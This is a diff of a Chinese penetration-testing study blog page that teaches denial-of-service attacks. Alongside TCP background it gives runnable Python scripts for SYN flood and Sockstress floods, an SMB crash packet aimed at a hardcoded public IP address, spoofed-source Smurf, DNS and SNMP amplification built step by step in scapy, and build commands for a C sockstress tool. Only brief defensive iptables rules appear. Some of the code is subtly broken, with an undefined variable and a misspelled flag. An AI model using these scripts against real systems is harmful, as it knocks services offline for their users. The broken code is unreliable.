@@ -1244,6 +1244,28 @@ root@kali:~# lastlog
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -1273,7 +1295,710 @@ root@kali:~# lastlog
       
         
           
-            
+            <h2 id="拒绝服务常见的攻击方式总结"><a href="#拒绝服务常见的攻击方式总结" class="headerlink" title="拒绝服务常见的攻击方式总结"></a>拒绝服务常见的攻击方式总结</h2><h4 id="1-拒绝服务简介"><a href="#1-拒绝服务简介" class="headerlink" title="1.拒绝服务简介"></a>1.拒绝服务简介</h4><ul>
+<li>Dos不是Ddos<ul>
+<li>利用程序漏洞或一对一资源耗尽的Denial of service拒绝服务</li>
+</ul>
+</li>
+<li>DDos分布式拒绝服务<ul>
+<li>一对一的攻击完全拼各自的资源，效果差。</li>
+<li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li>
+</ul>
+</li>
+<li>历史<ul>
+<li>以前：欠缺技术能力的无赖，我ping死你</li>
+<li>现在：最强大最危险的攻击，攻击方式众多<ul>
+<li>贩卖和租用肉鸡已经成为黑产种重要的一部分</li>
+<li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2.DoS分类"></a>2.DoS分类</h4><ul>
+<li>D网络<ul>
+<li>基于巨量的Flood耗尽目标网络带宽资源</li>
+<li>ICMP Flood、UDP Flood</li>
+</ul>
+</li>
+<li>D协议<ul>
+<li>攻击协议漏洞发起的拒绝服务攻击</li>
+<li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL </li>
+</ul>
+</li>
+<li>D应用<ul>
+<li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li>
+<li>大量频繁访问消耗系统资源严重的应用（CC）</li>
+<li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li>
+<li>可以是一击毙命的，也可以是耗尽目标资源的</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-为何会被Dos"><a href="#3-为何会被Dos" class="headerlink" title="3.为何会被Dos"></a>3.为何会被Dos</h4><ul>
+<li>从攻击者到被害者<ul>
+<li>网络—&gt;FW（服务）—&gt;服务器OS—&gt;服务应用</li>
+</ul>
+</li>
+<li>资源耗尽<ul>
+<li>网络：带宽</li>
+<li>FW:吞吐量、并发连接</li>
+<li>服务器：CPU、内存、I/O</li>
+<li>应用：处理请求能力，对OS资源的使用权</li>
+</ul>
+</li>
+<li>程序漏洞攻击<ul>
+<li>缓冲区溢出</li>
+<li>协议、程序逻辑漏洞</li>
+</ul>
+</li>
+<li>链路上任何一点都可成为目标</li>
+</ul>
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200320111906.png" alt=""></p>
+<h3 id="拒绝服务——Syn-Flood攻击"><a href="#拒绝服务——Syn-Flood攻击" class="headerlink" title="拒绝服务——Syn-Flood攻击"></a>拒绝服务——Syn-Flood攻击</h3><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>1.TCP连接和端口过程</p>
+<p><strong>TCP建立连接</strong></p>
+<p>第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p>
+<p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
+<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p>
+<p>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：</p>
+<p>未连接队列<br>在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于SYN_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。<br><strong>关闭TCP连接</strong></p>
+<p>对于一个已经建立的连接，TCP使用改进的三次握手来释放连接（使用一个带有FIN附加标记的报文段）。TCP关闭连接的步骤如下：</p>
+<p>第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）。</p>
+<p>第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）。</p>
+<p>第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段。</p>
+<p>第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放。</p>
+<p>2.TCP 连接状态</p>
+<p><img src="SW5S4jW.png" alt="img"></p>
+<p>3.两个序号和三个标志位：</p>
+<ul>
+<li>序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。</li>
+<li>确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。</li>
+<li>标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：<ul>
+<li>URG：紧急指针（urgent pointer）有效。</li>
+<li>ACK：确认序号有效。</li>
+<li>PSH：接收方应该尽快将这个报文交给应用层。</li>
+<li>RST：重置连接。</li>
+<li>SYN：发起一个新连接。</li>
+<li>FIN：释放一个连接。</li>
+</ul>
+</li>
+<li>需要注意的是：<ul>
+<li>不要将确认序号ack与标志位中的ACK搞混了。</li>
+<li>认方ack=发起方req+1，两端配对</li>
+</ul>
+</li>
+</ul>
+<p><img src="qoYhkJa.png" alt="img"><br>在第一次消息发送中，A随机选取一个序列号作为自己的初始序号发送给B；第二次消息B使用ack对A的数据包进行确认，</p>
+<p>因为已经收到了序列号为x的数据包，准备接收序列号为x+1的包，所以ack=x+1，同时B告诉A自己的初始序列号，就是seq=y；</p>
+<p>第三条消息A告诉B收到了B的确认消息并准备建立连接，A自己此条消息的序列号是x+1，所以seq=x+1，而ack=y+1是表示A正准备接收B序列号为y+1的数据包。</p>
+<p><strong>4.四次挥手</strong></p>
+<ul>
+<li>由于TCP连接时全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，</li>
+<li>收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN</li>
+<li>首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。<ul>
+<li>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态</li>
+<li>第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</li>
+<li>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</li>
+<li>第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-scapy构造数据包"><a href="#1-scapy构造数据包" class="headerlink" title="1.scapy构造数据包"></a>1.scapy构造数据包</h4><h5 id="1-构造-IP-数据包"><a href="#1-构造-IP-数据包" class="headerlink" title="1. 构造 IP 数据包"></a><strong>1. 构造 IP 数据包</strong></h5><pre><code>&gt;&gt;&gt; i=IP()
+&gt;&gt;&gt; i.display()</code></pre><p><img src="E3mSTtG.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; i.dst=&quot;10.10.10.132&quot;
+&gt;&gt;&gt; i.display()</code></pre><p><img src="KO66HGs.png" alt="img"></p>
+<h5 id="2-构造TCP数据包"><a href="#2-构造TCP数据包" class="headerlink" title="2.构造TCP数据包"></a>2.构造TCP数据包</h5><pre><code>&gt;&gt;&gt; t=TCP()
+&gt;&gt;&gt; t.display()</code></pre><p><img src="DCJyqt6.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; t.dport=22
+&gt;&gt;&gt; t.display()</code></pre><p><img src="y3zVkjb.png" alt="img"></p>
+<h5 id="3-发送数据包需要构造成-IP-TCP-形式：i-t"><a href="#3-发送数据包需要构造成-IP-TCP-形式：i-t" class="headerlink" title="3. 发送数据包需要构造成 IP()/TCP() 形式：i/t"></a><strong>3. 发送数据包需要构造成 IP()/TCP() 形式：i/t</strong></h5><pre><code>&gt;&gt;&gt; sr1(i/t,verbose=1,timeout=2)</code></pre><p><img src="WNZ7i9P.png" alt="img"></p>
+<h5 id="4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："><a href="#4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：" class="headerlink" title="4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："></a><strong>4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：</strong></h5><pre><code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROP
+
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROP</code></pre><h3 id="2-脚本攻击"><a href="#2-脚本攻击" class="headerlink" title="2. 脚本攻击"></a>2. 脚本攻击</h3><h4 id="脚本攻击-linux-服务器"><a href="#脚本攻击-linux-服务器" class="headerlink" title="脚本攻击 linux 服务器"></a>脚本攻击 linux 服务器</h4><p>1.脚本内容</p>
+<pre><code>#!/usr/bin/python
+#coding=utf-8
+
+from scapy.all import*
+from time import sleep
+import thread
+import random
+import logging
+
+logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
+
+if len(sys.argv) != 4:
+    print &quot;用法: ./syn_flood.py [IP地址] [端口] [线程数]&quot;
+    print &quot;举例: ../syn_flood.py  1.1.1.1 80 20&quot;
+    sys.exit()
+
+target = str(sys.argv[1])
+port= int(sys.argv[2])
+threads = int(sys.argv[3])
+
+print&quot;正在执行 SYN flood 攻击，按 Ctrl+C 停止攻击。&quot;
+def synflood(target,port):
+    while 1:
+        x = random.randint(0,65535)
+        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
+        sr1(i/t,verbose=1,timeout=2)
+
+for x in range(0,threads):
+    thread.start_new_thread(synflood,(target,port))
+
+while 1:
+  sleep(1)
+</code></pre><p>2.执行脚本</p>
+<pre><code>root@kali:~# python syn_flood.py 10.10.10.141 22 200
+# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.132 -j DROP</code></pre><p>抓包发现网络上充满数据包</p>
+<p><img src="8QfyVAU.png" alt="img"></p>
+<p>使用 ssh 连接 服务器发现无法响应</p>
+<p><img src="8EWXAt7.png" alt="img"></p>
+<p>在服务器使用 top 查看内存占用情况，发现占用极少</p>
+<p><img src="wxcaUbA.png" alt="img"></p>
+<p>在服务器查看连接，发现连接数非常多</p>
+<p><img src="sHDzLpP.png" alt="img"></p>
+<pre><code>查看 linux 服务器最大 TCP 连接数发现是 255 个
+netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code></pre><h5 id="2-攻击windows机器"><a href="#2-攻击windows机器" class="headerlink" title="2.攻击windows机器"></a>2.攻击windows机器</h5><p>1.测试可用性</p>
+<pre><code>root@kali:~# rdesktop 10.10.10.141</code></pre><p><img src="wYUMp3w.png" alt="img"></p>
+<p>2.执行脚本</p>
+<pre><code>root@kali:~# python syn_flood.py 10.10.10.141 3389 10
+# 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.10.10.141 -j DROP
+
+root@kali:~# rdesktop 10.10.10.141
+</code></pre><p><img src="uH5y56U.png" alt="img"></p>
+<p>winxp 的最大半开连接数只有 10 个</p>
+<h4 id="泛洪攻击常伴随IP地址欺骗"><a href="#泛洪攻击常伴随IP地址欺骗" class="headerlink" title="泛洪攻击常伴随IP地址欺骗"></a>泛洪攻击常伴随IP地址欺骗</h4><p><img src="OIWj7fT.jpg" alt="img"></p>
+<p>伪造源地址为 3.3.3.3，访问许多网站，将响应数据包发送给 3.3.3.3</p>
+<ul>
+<li>经常用于 DoS 攻击</li>
+<li>根据 IP 头地址寻址<ul>
+<li>伪造IP源地址</li>
+</ul>
+</li>
+<li>便捷路由器过滤源IP<ul>
+<li>入站、出站</li>
+</ul>
+</li>
+<li>受害者可能是源、目的地址</li>
+<li>绕过基于地址的验证</li>
+<li>压力测试模拟多用户</li>
+<li>上层协议（TCP序列号）</li>
+</ul>
+<h4 id="拒绝服务——Smurf攻击"><a href="#拒绝服务——Smurf攻击" class="headerlink" title="拒绝服务——Smurf攻击"></a>拒绝服务——Smurf攻击</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
+<li>向广播地址发送伪造源地址的 ICMP echo Request （ping）包</li>
+<li>LAN 所有计算机向伪造源地址返回响应包</li>
+<li>对现代操作系统几乎无效（不响应目标为广播的ping）</li>
+</ul>
+<h5 id="2-测试攻击"><a href="#2-测试攻击" class="headerlink" title="2.测试攻击"></a>2.测试攻击</h5><pre><code>&gt;&gt;&gt; i=IP()
+&gt;&gt;&gt; i.display()</code></pre><p><img src="G91A6l1.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; i.src=&quot;10.10.10.132&quot;
+&gt;&gt;&gt; i.dst=&quot;10.10.10.255&quot;</code></pre><p><img src="PjqvNVP.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; p=ICMP()
+&gt;&gt;&gt; p.display()</code></pre><p><img src="Zr6n0yF.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; r=send(i/p)</code></pre><p><img src="mdv0dml.png" alt="img"></p>
+<pre><code># 使用一行发送：
+send(IP(dst=&quot;10.10.10.255&quot;,src=&quot;10.10.10.132&quot;)/ICMP(),count=100,verbose=1</code></pre><h3 id="拒绝服务–Sockstress-攻击"><a href="#拒绝服务–Sockstress-攻击" class="headerlink" title="拒绝服务–Sockstress 攻击"></a>拒绝服务–Sockstress 攻击</h3><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
+<li>2008年由Jack C.Louis 发现</li>
+<li>针对TCP服务的拒绝服务攻击<ul>
+<li>消耗被攻击目标系统资源</li>
+<li>与攻击目标建立大量socket链接</li>
+<li>完成三次握手，最后的ACK包window 大小为0 (客户端不接收数据)</li>
+<li>攻击者资源消耗小(CPU、内存、带宽)</li>
+<li>异步攻击，单机可拒绝服务高配资源服务器</li>
+<li>Window 窗口实现的TCP 流控</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-脚本攻击-1"><a href="#2-脚本攻击-1" class="headerlink" title="2.脚本攻击"></a>2.脚本攻击</h4><h5 id="1-python测试脚本"><a href="#1-python测试脚本" class="headerlink" title="1.python测试脚本"></a>1.python测试脚本</h5><pre><code>#!/usr/bin/python
+#coding=utf-8
+
+from scapy.all import*
+from time import sleep
+import thread
+import random
+import logging
+import os
+import signal
+import sys
+import signal
+
+logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
+
+if len(sys.argv) != 4:
+    print &quot;用法: ./sockstress.py [IP地址] [端口] [线程数]&quot;
+    print &quot;举例: ../sockstress.py  1.1.1.1 80 20 # 请确定被攻击端口处于开放状态&quot;
+    sys.exit()
+
+target = str(sys.argv[1])
+dstport= int(sys.argv[2])
+threads = int(sys.argv[3])
+
+## 攻击函数
+def sockstress(target,dstport) :
+    while 0 == 0:
+        try:
+            x = random.randint(0,65535)
+            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags = &#39;S&#39;),timeout=1,verbose=0)
+            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,lags=&#39;A&#39;,ack=(response[TCP].seq + 1) )/&#39;\x00\x00&#39;,verbose=0)
+        except:
+            pass
+
+## 停止攻击函数
+def shutdown(signal,frame):
+    print &quot;正在修复 iptables 规则&quot;
+    os.system(&#39;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d &#39;+ target +&#39; -j DROP&#39;)
+    sys.exit()
+
+## 添加iptables规则
+os.system(&#39;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d &#39;+ target +&#39; -j DROP&#39;)
+signal.signal(signal.SIGINT, shutdown)
+
+## 多线程攻击
+print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;
+for x in range(0,threads):
+    thread.start_new_thread(sockstress, (target,dstport))
+
+##永远执行
+while 0 == 0:
+    sleep(1)</code></pre><ul>
+<li><p>测试结果</p>
+<pre><code># 查看系统连接数
+netstat | grep ESTABLISHED | wc -l</code></pre></li>
+</ul>
+<p><img src="zdOuFdq.png" alt="img"></p>
+<h5 id="2-C攻击脚本"><a href="#2-C攻击脚本" class="headerlink" title="2.C攻击脚本"></a>2.C攻击脚本</h5><ul>
+<li>下载编译</li>
+</ul>
+<p><a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">github 下载地址</a></p>
+<pre><code>gcc -Wall -c sockstress.c
+gcc -pthread -o sockstress sockstress.o
+./sockstress 10.10.10.132:80 eth0
+./sockstress 10.10.10.132:80 eth0 -p payloads/http
+
+防火墙规则
+iptables -A OUTPUT -p TCP --tcp-flags rst rst -d 10.10.10.132 -j DROP</code></pre><ul>
+<li><p>查看攻击效果</p>
+<pre><code>netstat -tulnp | grep ESTABLISHED | wc -l
+free
+top</code></pre></li>
+</ul>
+<h4 id="3-防御措施"><a href="#3-防御措施" class="headerlink" title="3.防御措施"></a>3.防御措施</h4><ul>
+<li>直到今天sockstress攻击仍然是一种很有效的DOS攻击方式</li>
+<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效</li>
+<li>根本的防御方法是采用白名单(不实际)</li>
+<li>折中对策限制单位时间内每IP建的TCP连接数<ul>
+<li>封杀每30秒与 80 端口建立连接超过 10 个的IP地址</li>
+<li>iptables -I INPUT -p tcp –dport 80 -m state–state NEW -m recent–set</li>
+<li>iptables -I INPUT-p tcp -dport 80 -m state-state NEW-m recent -update–seconds 30 -hitcount 10 j DROP</li>
+<li>以上规则对DDOS攻击无效</li>
+</ul>
+</li>
+</ul>
+<h3 id="拒绝服务–TearDrop-攻击"><a href="#拒绝服务–TearDrop-攻击" class="headerlink" title="拒绝服务–TearDrop 攻击"></a>拒绝服务–TearDrop 攻击</h3><h4 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
+<li>主要针对早期微软操作系统（95、98、3.x、nt）<ul>
+<li>近些年有人发现对 2.x 版本的安卓系统、6.0 IOS 系统攻击有效</li>
+</ul>
+</li>
+<li>原理很有趣<ul>
+<li>使用 IP 分段便宜实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li>
+</ul>
+</li>
+<li>攻击效果<ul>
+<li>被攻击者蓝屏、重启、卡死</li>
+</ul>
+</li>
+</ul>
+<p><img src="w9pzlfZ.png" alt="img"></p>
+<ul>
+<li>Ping大包，比较正常分段与teardrop攻击流量的区别</li>
+<li>针对早期windows系统SMB协议的攻击<ul>
+<li>teardrop_smb.py</li>
+</ul>
+</li>
+<li>针对Android.IOS 系统的攻击<ul>
+<li>teardrop_androidios.py</li>
+</ul>
+</li>
+<li>攻击向量并不确定，要视具体协议分析</li>
+</ul>
+<h4 id="2-攻击目标"><a href="#2-攻击目标" class="headerlink" title="2.攻击目标"></a>2.攻击目标</h4><p>泪滴攻击是一种拒绝服务（DoS）攻击，涉及将碎片数据包发送到目标机器。由于接收这些数据包的机器由于TCP / IP碎片重组错误而无法重新组装，因此数据包相互重叠，导致目标网络设备崩溃。这通常发生在较早的操作系统上，例如Windows 3.1x，Windows 95，Windows NT和2.1.63之前版本的Linux内核。</p>
+<p>IP报头中的一个字段是“片段偏移量”字段，指示包含在分段数据包中的数据相对于原始数据包中的数据的起始位置或偏移量。如果一个分片数据包的偏移量和大小之和不同于下一个分片数据包的偏移量和大小之和，则数据包重叠。发生这种情况时，易受泪滴攻击的服务器无法重新组装数据包 - 从而导致拒绝服务状况。</p>
+<h4 id="3-攻击脚本"><a href="#3-攻击脚本" class="headerlink" title="3.攻击脚本"></a>3.攻击脚本</h4><pre><code>#!/usr/bin/python
+# When SMB2.0 recieve a &quot;&amp;&quot; char in the &quot;Process Id High&quot;
+# SMB header field it dies with a
+# PAGE_FAULT_IN_NONPAGED_AREA
+# filename: teardrop-attack-smb.py
+
+import sys
+from socket import socket
+from time import sleep
+
+#host = sys.argv[1], 445
+#host = &quot;192.168.33.13&quot;, 445
+host = &quot;217.113.205.53&quot;, 445
+buff = (
+&quot;\x00\x00\x00\x90&quot; # Begin SMB header: Session message
+&quot;\xff\x53\x4d\x42&quot; # Server Component: SMB
+&quot;\x72\x00\x00\x00&quot; # Negociate Protocol
+&quot;\x00\x18\x53\xc8&quot; # Operation 0x18 &amp; sub 0xc853
+&quot;\x00\x26&quot;# Process ID High: --&gt; :) normal value should be &quot;\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe&quot;
+&quot;\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54&quot;
+&quot;\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31&quot;
+&quot;\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00&quot;
+&quot;\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57&quot;
+&quot;\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61&quot;
+&quot;\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c&quot;
+&quot;\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c&quot;
+&quot;\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e&quot;
+&quot;\x30\x30\x32\x00&quot;
+)
+s = socket()
+s.connect(host)
+s.send(buff)
+s.close()</code></pre><h4 id="拒绝服务–DNS-放大攻击"><a href="#拒绝服务–DNS-放大攻击" class="headerlink" title="拒绝服务–DNS 放大攻击"></a>拒绝服务–DNS 放大攻击</h4><h4 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
+<li>产生大流量的攻击方法<ul>
+<li>单机的带宽优势</li>
+<li>巨大单机数量形成的流量汇聚</li>
+<li>利用协议特性实现放大效果的流量</li>
+</ul>
+</li>
+<li>DNS协议放大效果<ul>
+<li>查询请求流量小，但响应流量可能非常巨大</li>
+<li>dig ANY hp.com @202 106.0.20 (流量放大约8倍)</li>
+</ul>
+</li>
+<li>攻击原理<ul>
+<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
+<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDOS</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h4><pre><code>root@kali:~# dig any baidu.com @114.114.114.114</code></pre><p>发送60字节长度，返回216字节长度</p>
+<p><img src="GqPGP9F.png" alt="img"></p>
+<h4 id="3-Scapy构造攻击数据包原理"><a href="#3-Scapy构造攻击数据包原理" class="headerlink" title="3.Scapy构造攻击数据包原理"></a>3.Scapy构造攻击数据包原理</h4><ul>
+<li>IP/UDP/DNS/DNS 查询内容</li>
+</ul>
+<p><img src="px5Ihn0.png" alt="img"></p>
+<ul>
+<li>结合IP地址欺骗，利用大量 DNS 服务器做傀儡攻击目标</li>
+</ul>
+<h4 id="4-构造数据包过程"><a href="#4-构造数据包过程" class="headerlink" title="4.构造数据包过程"></a>4.构造数据包过程</h4><p>1.构造 IP 数据包</p>
+<pre><code>&gt;&gt;&gt; i=IP()
+&gt;&gt;&gt; i.display()</code></pre><p><img src="z1OV3Jv.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; i.dst=&quot;114.114.114.114&quot;
+&gt;&gt;&gt; i.display()</code></pre><p><img src="3MXZboo.png" alt="img"></p>
+<p>2.构造UDP数据包</p>
+<pre><code>&gt;&gt;&gt; u=UDP()
+&gt;&gt;&gt; u.display()</code></pre><p><img src="14c4SzU.png" alt="img"></p>
+<p>3.构造 DNS 数据包</p>
+<pre><code>&gt;&gt;&gt; d=DNS()
+&gt;&gt;&gt; d.display()</code></pre><p><img src="aZfTrYu.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; d.rd=1
+&gt;&gt;&gt; d.qdcount=1
+&gt;&gt;&gt; d.display()</code></pre><p><img src="aBZdHNP.png" alt="img"></p>
+<p>4.设置查询目标</p>
+<pre><code>&gt;&gt;&gt; q=DNSQR()
+&gt;&gt;&gt; q.display()</code></pre><p><img src="qcAPHGS.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; q.qname=&#39;qq.com&#39;
+&gt;&gt;&gt; q.qtype=255   #（代表any）</code></pre><p><img src="DiDX3Nk.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; d.qd=q   # 设置目标
+&gt;&gt;&gt; d.display()</code></pre><p><img src="ucWhz05.png" alt="img"></p>
+<p>5.拼接数据包</p>
+<pre><code>&gt;&gt;&gt; r=(i/u/d)
+&gt;&gt;&gt; r</code></pre><p><img src="BYH2G1x.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; r.display()
+&gt;&gt;&gt; sr1(r)</code></pre><p><img src="mjWweAd.png" alt="img"></p>
+<pre><code>&gt;&gt;&gt; i.src=&quot;10.10.10.141&quot;
+&gt;&gt;&gt; r=(i/u/d)
+&gt;&gt;&gt; r.display()</code></pre><p>6.发送数据包</p>
+<pre><code>&gt;&gt;&gt; send(r)</code></pre><p>发送 60 字节的数据包，返回 2；l30 字节的数据包</p>
+<p><img src="j8EXlRY.png" alt="img"></p>
+<h3 id="拒绝服务——SNMP服务"><a href="#拒绝服务——SNMP服务" class="headerlink" title="拒绝服务——SNMP服务"></a>拒绝服务——SNMP服务</h3><h4 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
+<li>简单网络管理协议</li>
+<li>Simmple Network Management Protocol<ul>
+<li>一般用来监控和管理网络设备</li>
+</ul>
+</li>
+<li>服务端口UDP 161/162<ul>
+<li>管理站(manager/客户端)、被管理设备(agent/服务端)</li>
+<li>管理信息数据库(MIB) 是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li>
+<li>每一个节点都有一个对象标识符(OID) 来唯一的标识一IETF定义便准的MIB库厂家自定义MIB库</li>
+</ul>
+</li>
+<li>攻击原理</li>
+<li>请求流量小，查询结果返回流量大<ul>
+<li>结合伪造源地址实现攻击</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-安装SNMP"><a href="#2-安装SNMP" class="headerlink" title="2.安装SNMP"></a>2.安装SNMP</h4><ul>
+<li>安装 SNMP，定义 community</li>
+</ul>
+<p><img src="okOSYrp.png" alt="img"></p>
+<p><img src="TZf6kGU.png" alt="img"></p>
+<p><img src="aH8IJJ2.png" alt="img"></p>
+<h4 id="3-scapy构造数据包"><a href="#3-scapy构造数据包" class="headerlink" title="3.scapy构造数据包"></a>3.scapy构造数据包</h4><ul>
+<li>流程</li>
+</ul>
+<p><img src="28X1RdW.png" alt="img"></p>
+<ul>
+<li>步骤</li>
+</ul>
+<p><strong>构造 IP 数据包</strong></p>
+<pre><code>&gt;&gt;&gt; i=IP()
+&gt;&gt;&gt; i.dst=&quot;10.10.10.142&quot;
+&gt;&gt;&gt; i.display()</code></pre><p><img src="mDZkeVN.png" alt="img"></p>
+<p><strong>构造 UDP 数据包</strong></p>
+<pre><code>&gt;&gt;&gt; u=UDP()
+&gt;&gt;&gt; u.dport=161
+&gt;&gt;&gt; u.sport=161</code></pre><p><img src="wq7hyEF.png" alt="img"></p>
+<p><strong>构造 SNMP 数据包</strong></p>
+<pre><code>&gt;&gt;&gt; s=SNMP()</code></pre><p><img src="LGtwfwK.png" alt="img"></p>
+<p><strong>设置放大倍数</strong></p>
+<pre><code>&gt;&gt;&gt; b=SNMPbulk()
+&gt;&gt;&gt; b.max_repetitions=100
+&gt;&gt;&gt; b.varbindlist=[SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.1&#39;)),SNMPvarbind(oid=ASN1_OID(&#39;1.3.6.1.2.1.19.1.3&#39;))]
